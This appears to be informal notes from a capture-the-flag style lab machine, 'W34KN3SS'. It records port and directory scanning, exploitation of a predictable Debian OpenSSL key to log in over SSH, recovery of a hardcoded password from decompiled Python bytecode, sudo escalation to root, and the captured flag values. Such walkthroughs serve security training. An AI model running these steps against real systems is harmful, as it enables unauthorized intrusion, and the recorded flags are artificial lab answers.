└─$ nmap -sSCV -p 22,80,443 192.168.178.130
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-07 23:59 PDT
Nmap scan report for 192.168.178.130
Host is up (0.00051s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 de:89:a2:de:45:e7:d6:3d:ef:e9:bd:b4:b6:68:ca:6d (RSA)
|   256 1d:98:4a:db:a2:e0:cc:68:38:93:d0:52:2a:1a:aa:96 (ECDSA)
|_  256 3d:8a:6b:92:0d:ba:37:82:9e:c3:27:18:b6:01:cd:98 (ED25519)
80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| tls-alpn: 
|_  http/1.1
|_http-title: Apache2 Ubuntu Default Page: It works
| ssl-cert: Subject: commonName=weakness.jth/organizationName=weakness.jth/stateOrProvinceName=Jordan/countryName=jo
| Not valid before: 2018-05-05T11:12:54
|_Not valid after:  2019-05-05T11:12:54
|_ssl-date: TLS randomness does not represent time
MAC Address: 00:0C:29:6F:5B:A1 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

//add weakness.jth to hosts

00:27:10] 403 -  300B  - /.htaccessOLD2
[00:27:10] 403 -  291B  - /.htm
[00:27:10] 403 -  292B  - /.html
[00:27:10] 403 -  301B  - /.htpasswd_test
[00:27:10] 403 -  297B  - /.htpasswds
[00:27:10] 403 -  298B  - /.httr-oauth
[00:27:11] 403 -  291B  - /.php
[00:27:30] 301 -  314B  - /private  ->  http://weakness.jth/private/
[00:27:31] 200 -   14B  - /robots.txt

http://weakness.jth/private/files/notes.txt

this key was generated by openssl 0.9.8c-1

http://weakness.jth/private/files/mykey.pub

ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApC39uhie9gZahjiiMo+k8DOqKLujcZMN1bESzSLT8H5jRGj8n1FFqjJw27Nu5JYTI73Szhg/uoeMOfECHNzGj7GtoMqwh38clgVjQ7Qzb47/kguAeWMUcUHrCBz9KsN+7eNTb5cfu0O0QgY+DoLxuwfVufRVNcvaNyo0VS1dAJWgDnskJJRD+46RlkUyVNhwegA0QRj9Salmpssp+z5wq7KBPL1S982QwkdhyvKg3dMy29j/C5sIIqM/mlqilhuidwo1ozjQlU2+yAVo5XrWDo0qVzzxsnTxB5JAfF7ifoDZp2yczZg+ZavtmfItQt1Vac1vSuBPCpTqkjE/4Iklgw== root@targetcluster

//search openssl 0.9.8c-1 on deexpliot, we found the pub/pri key pairs are fix 65535, and we get pub key, we just search for the pri key for it. from the link we can get the list, and we found, pub/pri key with same name. 

└─$ ls 2048 | wc -l
65536  //as we expected
         
└─$ grep -r -l "AAAAB3NzaC1yc2EAAAABIwAAAQEApC39uhie9gZahjiiMo+k8DOqKLujcZMN1bESzSLT8H5jRGj8n1FFqjJw27Nu5JYTI73Szhg/uoeMOfECHNzGj7GtoMqwh38clgVjQ7Qzb47/kguAeWMUcUHrCBz9KsN+7eNTb5cfu0O0QgY+DoLxuwfVufRVNcvaNyo0VS1dAJWgDnskJJRD+46RlkUyVNhwegA0QRj9Salmpssp+z5wq7KBPL1S982QwkdhyvKg3dMy29j/C5sIIqM/mlqilhuidwo1ozjQlU2+yAVo5XrWDo0qVzzxsnTxB5JAfF7ifoDZp2yczZg+ZavtmfItQt1Vac1vSuBPCpTqkjE/4Iklgw== root@targetcluster" /home/ed/Downloads/rsa/2048
/home/ed/Downloads/rsa/2048/4161de56829de2fe64b9055711f531c1-2537.pub
                                                                      
─$ ssh -i 4161de56829de2fe64b9055711f531c1-2537 n30@192.168.178.130 
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Tue Aug 14 13:29:20 2018 from 192.168.209.1
n30@W34KN3SS:~$ cat user.txt 
25e3cd678875b601425c9356c8039f68

n30@W34KN3SS:/var/www/html$ cp /home/n30/code .
n30@W34KN3SS:/var/www/html$ ls
blog  code  index.html  test  upload.php  uploads
n30@W34KN3SS:/var/www/html$ file code
code: python 2.7 byte-compiled
n30@W34KN3SS:/var/www/html$ 

# Visit https://www.lddgo.net/en/string/pyc-compile-decompile for more information
# Version : Python 2.7


//download code file and add suxfix .pyc for decomplier

import os
import socket
import time
import hashlib
print '[+]System Started at : {0}'.format(time.ctime())
print '[+]This binary should generate unique hash for the hardcoded login info'
print '[+]Generating the hash ..'
inf = ''
inf += chr(ord('n'))
inf += chr(ord('3'))
inf += chr(ord('0'))
inf += chr(ord(':'))
inf += chr(ord('d'))
inf += chr(ord('M'))
inf += chr(ord('A'))
inf += chr(ord('S'))
inf += chr(ord('D'))
inf += chr(ord('N'))
inf += chr(ord('B'))
inf += chr(ord('!'))
inf += chr(ord('!'))
inf += chr(ord('#'))
inf += chr(ord('B'))
inf += chr(ord('!'))
inf += chr(ord('#'))
inf += chr(ord('!'))
inf += chr(ord('#'))
inf += chr(ord('3'))
inf += chr(ord('3'))
hashf = hashlib.sha256(inf + time.ctime()).hexdigest()
print '[+]Your new hash is : {0}'.format(hashf)
print '[+]Done'

//it seems the passwd of n30: dMASDNB!!#B!#!#33

└─$ ssh n30@192.168.178.130              
n30@192.168.178.130's password: 
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Thu May  8 11:22:45 2025 from 192.168.178.129
n30@W34KN3SS:~$ sudo -l
[sudo] password for n30: 
Matching Defaults entries for n30 on W34KN3SS:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User n30 may run the following commands on W34KN3SS:
    (ALL : ALL) ALL
n30@W34KN3SS:~$ sudo /bin/bash
root@W34KN3SS:~# id
uid=0(root) gid=0(root) groups=0(root)
root@W34KN3SS:~# cd /
root@W34KN3SS:/# ls
bin   etc         initrd.img.old  lost+found  opt   run   swapfile  usr      vmlinuz.old
boot  home        lib             media       proc  sbin  sys       var
dev   initrd.img  lib64           mnt         root  srv   tmp       vmlinuz
root@W34KN3SS:/# cd root
root@W34KN3SS:/root# ls
root.txt
root@W34KN3SS:/root# cat root.txt 
a1d2fab76ec6af9b651d4053171e042e
